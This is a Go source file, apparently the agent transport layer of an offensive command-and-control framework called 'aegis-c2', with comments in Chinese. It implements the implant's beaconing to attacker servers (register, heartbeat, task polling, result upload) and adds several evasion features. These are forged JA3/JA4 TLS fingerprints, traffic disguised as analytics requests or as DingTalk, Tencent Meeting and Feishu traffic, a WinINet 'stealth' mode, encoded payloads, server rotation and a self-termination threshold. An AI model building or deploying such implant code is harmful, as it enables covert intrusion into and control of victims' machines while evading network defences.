package transport

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/aegis-c2/aegis/agent/fingerprint"
	"github.com/aegis-c2/aegis/shared/compress"
	"github.com/aegis-c2/aegis/shared/encoder"
	"github.com/aegis-c2/aegis/shared/protocol"
)

// Transport 封装了 Agent 与服务器的 HTTP(S) 通信。
// 支持 Profile 驱动的 URI/Header 变换、Host Rotation、Payload 编码。
type Transport struct {
	serverURLs    []string // 多服务器 URL
	strategy      string   // round-robin/random/failover
	userAgent     string
	method        string
	path          string
	headers       map[string]string
	cookieName    string
	paramName     string
	dataTransform string // base64/base64-url/base58/hex/nop
	insecureTLS   bool
	client        *http.Client

	// Host Rotation 状态
	mu           sync.Mutex
	currentIndex int
	failCounts   map[string]int
	deadHosts    map[string]bool

	// 指数退避状态
	backoffMs    int       // 当前退避时长（毫秒）
	lastFailTime time.Time // 上次失败时间
	maxBackoffMs int       // 最大退避上限（默认 60000）

	// 连续错误计数（Sliver: MaxConnectionErrors 自毁阈值）
	connectionErrors  int
	maxConnErrors     int // 0=不限制，>0=达到后终止
}

func New(serverURL, userAgent string, heartbeatSec, jitterSec int, insecureSkipTLS bool) *Transport {
	return NewWithProfile(&ProfileConfig{
		ServerURLs:    []string{serverURL},
		UserAgent:     userAgent,
		Method:        "POST",
		Path:          "/api/v1/analytics",
		Headers:       map[string]string{"Accept": "application/json", "Content-Type": "application/json"},
		CookieName:    "session_id",
		ParamName:     "data",
		DataTransform: "base64",
		RotationStrategy: "failover",
		InsecureTLS:   insecureSkipTLS,
	})
}

// ProfileConfig 是 Profile-aware Transport 的配置。
type ProfileConfig struct {
	ServerURLs     []string
	UserAgent      string
	Method         string
	Path           string
	Headers        map[string]string
	CookieName     string
	ParamName      string
	DataTransform  string
	RotationStrategy string
	InsecureTLS    bool
	TLSFingerprint fingerprint.BrowserProfile  // JA3/JA4 指纹伪造
	Camouflage     string                      // 流量伪装配置名 (dingtalk/tencent_meeting/feishu)
	UseWinINet     bool                        // 使用 WinINet API 替代标准 HTTP（仅 Windows）
}

// NewWithProfile 创建支持 Profile 的 Transport。
func NewWithProfile(cfg *ProfileConfig) *Transport {
	var rt http.RoundTripper

	// WinINet stealth transport (Windows only)
	if cfg.UseWinINet {
		if winRT := newWininetTransport(cfg.UserAgent); winRT != nil {
			rt = winRT
		}
	}

	// Fallback: standard/utls transport
	if rt == nil {
		var tr *http.Transport

		// 如果配置了 TLS 指纹，使用 utls 替代标准 crypto/tls
		if cfg.TLSFingerprint != "" {
			tlsCfg := &fingerprint.Config{
				Profile:        cfg.TLSFingerprint,
				InsecureVerify: cfg.InsecureTLS,
				ALPNProtocols:  []string{"h2", "http/1.1"},
			}
			t, err := tlsCfg.Transport()
			if err != nil {
				// fallback to standard TLS
				tr = &http.Transport{
					TLSClientConfig: &tls.Config{InsecureSkipVerify: cfg.InsecureTLS},
				}
			} else {
				tr = t
			}
		} else {
			tr = &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: cfg.InsecureTLS},
			}
		}
		rt = tr
	}

	t := &Transport{
		serverURLs:    cfg.ServerURLs,
		strategy:      cfg.RotationStrategy,
		userAgent:     cfg.UserAgent,
		method:        cfg.Method,
		path:          cfg.Path,
		headers:       cfg.Headers,
		cookieName:    cfg.CookieName,
		paramName:     cfg.ParamName,
		dataTransform: cfg.DataTransform,
		insecureTLS:   cfg.InsecureTLS,
		client: &http.Client{
			Transport: rt,
			Timeout:   30 * time.Second,
		},
		failCounts:   make(map[string]int),
		deadHosts:    make(map[string]bool),
		backoffMs:    1000,
		maxBackoffMs: 60000,
	}
	if len(t.serverURLs) == 0 {
		t.serverURLs = []string{"http://127.0.0.1:8443"}
	}
	return t
}

// getActiveHost 根据策略选择下一个可用的服务器 URL。
func (t *Transport) getActiveHost() string {
	t.mu.Lock()
	defer t.mu.Unlock()

	if t.strategy == "random" {
		// 随机选择未标记为 dead 的 host
		var alive []string
		for _, u := range t.serverURLs {
			if !t.deadHosts[u] {
				alive = append(alive, u)
			}
		}
		if len(alive) == 0 {
			// 全部 dead，重置
			t.deadHosts = make(map[string]bool)
			return t.serverURLs[0]
		}
		return alive[rand.Intn(len(alive))]
	}

	// round-robin / failover：顺序选择
	for i := 0; i < len(t.serverURLs); i++ {
		idx := (t.currentIndex + i) % len(t.serverURLs)
		url := t.serverURLs[idx]
		if !t.deadHosts[url] {
			t.currentIndex = idx
			return url
		}
	}
	// 全部 dead，重置
	t.deadHosts = make(map[string]bool)
	t.currentIndex = 0
	return t.serverURLs[0]
}

// recordSuccess 记录成功，重置失败计数、退避和连接错误计数。
func (t *Transport) recordSuccess(url string) {
	t.mu.Lock()
	defer t.mu.Unlock()
	t.failCounts[url] = 0
	t.backoffMs = 1000 // 重置为 1 秒
	t.connectionErrors = 0 // Sliver: 成功后重置连接错误计数
}

// recordFailure 记录失败，超过阈值后标记为 dead，并递增指数退避。
func (t *Transport) recordFailure(url string) {
	t.mu.Lock()
	defer t.mu.Unlock()
	t.failCounts[url]++
	t.connectionErrors++
	if t.failCounts[url] >= 3 {
		t.deadHosts[url] = true
	}
	// 指数退避：每次失败翻倍，上限 maxBackoffMs
	t.backoffMs *= 2
	if t.backoffMs > t.maxBackoffMs {
		t.backoffMs = t.maxBackoffMs
	}
	t.lastFailTime = time.Now()
}

// ConnectionErrors 返回连续连接错误计数（Sliver: connectionErrors）。
func (t *Transport) ConnectionErrors() int {
	t.mu.Lock()
	defer t.mu.Unlock()
	return t.connectionErrors
}

// ShouldTerminate 检查是否已达到最大连接错误数（Sliver: MaxConnectionErrors 自毁）。
func (t *Transport) ShouldTerminate() bool {
	t.mu.Lock()
	defer t.mu.Unlock()
	if t.maxConnErrors <= 0 {
		return false
	}
	return t.connectionErrors >= t.maxConnErrors
}

// buildURL 将 host 和 path 组合，支持 query 参数注入。
func (t *Transport) buildURL(baseURL, path string, payload []byte) string {
	// 如果 profile 配置了 query 参数方式，将 payload 编码后附加
	if t.dataTransform != "" && t.paramName != "" {
		enc, err := encoder.GetEncoder(t.dataTransform)
		if err != nil {
			log.Printf("[transport] unknown encoder %q, skipping transform", t.dataTransform)
			return baseURL + path
		}
		encoded := enc.Encode(payload)
		return fmt.Sprintf("%s%s?%s=%s", baseURL, path, t.paramName, encoded)
	}
	return baseURL + path
}

// post 发送 POST 请求，支持 Profile 驱动的 Header/URI 变换。
func (t *Transport) post(path string, env *protocol.Envelope) (*map[string]string, error) {
	// Serialize the full envelope first, then apply dataTransform at wire-level.
	body, err := json.Marshal(env)
	if err != nil {
		return nil, err
	}
	if t.dataTransform != "" {
		enc, err := encoder.GetEncoder(t.dataTransform)
		if err != nil {
			log.Printf("[transport] unknown encoder %q, sending plaintext body", t.dataTransform)
		} else {
			body = enc.Encode(body)
		}
	}

	url := t.getActiveHost() + path
	req, err := http.NewRequest(t.method, url, bytes.NewReader(body))
	if err != nil {
		return nil, err
	}

	// 应用 Profile 定义的 HTTP 头
	req.Header.Set("User-Agent", t.userAgent)
	for k, v := range t.headers {
		req.Header.Set(k, v)
	}

	// Cookie 注入
	if t.cookieName != "" {
		req.AddCookie(&http.Cookie{Name: t.cookieName, Value: env.AgentID})
	}

	resp, err := t.client.Do(req)
	if err != nil {
		t.recordFailure(t.getActiveHost())
		return nil, fmt.Errorf("http request failed: %w", err)
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		t.recordFailure(t.getActiveHost())
		return nil, fmt.Errorf("read response body: %w", err)
	}

	// 自动解压缩 gzip 响应
	if resp.Header.Get("Content-Encoding") == "gzip" {
		if decompressed, err := compress.GzipDecompress(respBody); err == nil {
			respBody = decompressed
		}
	}

	if resp.StatusCode != http.StatusOK {
		t.recordFailure(t.getActiveHost())
		return nil, fmt.Errorf("server error %d: %s", resp.StatusCode, string(respBody))
	}

	t.recordSuccess(t.getActiveHost())

	var result map[string]interface{}
	if err := json.Unmarshal(respBody, &result); err != nil {
		return nil, fmt.Errorf("decode response: %w", err)
	}

	strResult := make(map[string]string)
	for k, v := range result {
		strResult[k] = fmt.Sprintf("%v", v)
	}
	return &strResult, nil
}

// postRaw 发送 POST 请求并返回原始响应体（用于 PollTask）。
func (t *Transport) postRaw(path string, env *protocol.Envelope) ([]byte, error) {
	body, err := json.Marshal(env)
	if err != nil {
		return nil, err
	}
	if t.dataTransform != "" {
		enc, err := encoder.GetEncoder(t.dataTransform)
		if err != nil {
			log.Printf("[transport] unknown encoder %q, sending plaintext body", t.dataTransform)
		} else {
			body = enc.Encode(body)
		}
	}

	url := t.getActiveHost() + path
	req, err := http.NewRequest(t.method, url, bytes.NewReader(body))
	if err != nil {
		return nil, err
	}

	req.Header.Set("User-Agent", t.userAgent)
	for k, v := range t.headers {
		req.Header.Set(k, v)
	}
	if t.cookieName != "" {
		req.AddCookie(&http.Cookie{Name: t.cookieName, Value: env.AgentID})
	}

	resp, err := t.client.Do(req)
	if err != nil {
		t.recordFailure(t.getActiveHost())
		return nil, fmt.Errorf("http request failed: %w", err)
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		t.recordFailure(t.getActiveHost())
		return nil, fmt.Errorf("read response body: %w", err)
	}

	// 自动解压缩 gzip 响应
	if resp.Header.Get("Content-Encoding") == "gzip" {
		if decompressed, err := compress.GzipDecompress(respBody); err == nil {
			respBody = decompressed
		}
	}

	if resp.StatusCode != http.StatusOK {
		t.recordFailure(t.getActiveHost())
		return nil, fmt.Errorf("server error %d: %s", resp.StatusCode, string(respBody))
	}

	t.recordSuccess(t.getActiveHost())
	return respBody, nil
}

// Register 向 Server 发送注册请求。
func (t *Transport) Register(env *protocol.Envelope) (*map[string]string, error) {
	return t.post("/register", env)
}

// Heartbeat 发送心跳。
func (t *Transport) Heartbeat(env *protocol.Envelope) (*map[string]string, error) {
	return t.post("/heartbeat", env)
}

// PollTask 拉取待执行任务，返回原始 JSON 以便解析 TaskPayload。
func (t *Transport) PollTask(env *protocol.Envelope) ([]byte, error) {
	return t.postRaw("/poll", env)
}

// SubmitResult 回传任务结果。
func (t *Transport) SubmitResult(env *protocol.Envelope) (*map[string]string, error) {
	return t.post("/result", env)
}

// ActiveHosts 返回当前活跃的服务器 URL 列表。
func (t *Transport) ActiveHosts() []string {
	t.mu.Lock()
	defer t.mu.Unlock()
	var alive []string
	for _, u := range t.serverURLs {
		if !t.deadHosts[u] {
			alive = append(alive, u)
		}
	}
	if len(alive) == 0 {
		return t.serverURLs
	}
	return alive
}

// DeadHosts 返回已标记为 dead 的服务器 URL。
func (t *Transport) DeadHosts() []string {
	t.mu.Lock()
	defer t.mu.Unlock()
	var dead []string
	for u := range t.deadHosts {
		dead = append(dead, u)
	}
	return dead
}

// Strategy 返回当前使用的轮换策略。
func (t *Transport) Strategy() string {
	return t.strategy
}

// ShouldRetry 检查是否已经过了退避期，可以重试。
func (t *Transport) ShouldRetry() bool {
	t.mu.Lock()
	defer t.mu.Unlock()
	if t.backoffMs <= 0 {
		return true
	}
	elapsed := time.Since(t.lastFailTime).Milliseconds()
	return elapsed >= int64(t.backoffMs)
}

// BackoffDuration 返回下次重试前需要等待的时间。
func (t *Transport) BackoffDuration() time.Duration {
	t.mu.Lock()
	defer t.mu.Unlock()
	if t.backoffMs <= 0 {
		return 0
	}
	elapsed := time.Since(t.lastFailTime).Milliseconds()
	remaining := int64(t.backoffMs) - elapsed
	if remaining <= 0 {
		return 0
	}
	return time.Duration(remaining) * time.Millisecond
}

// SetDataTransform 设置数据编码变换方式。
func (t *Transport) SetDataTransform(transform string) {
	t.dataTransform = transform
}

// ParseServerURLs 解析逗号分隔的服务器 URL 列表。
func ParseServerURLs(s string) []string {
	parts := strings.Split(s, ",")
	urls := make([]string, 0, len(parts))
	for _, p := range parts {
		u := strings.TrimSpace(p)
		if u != "" {
			urls = append(urls, u)
		}
	}
	return urls
}
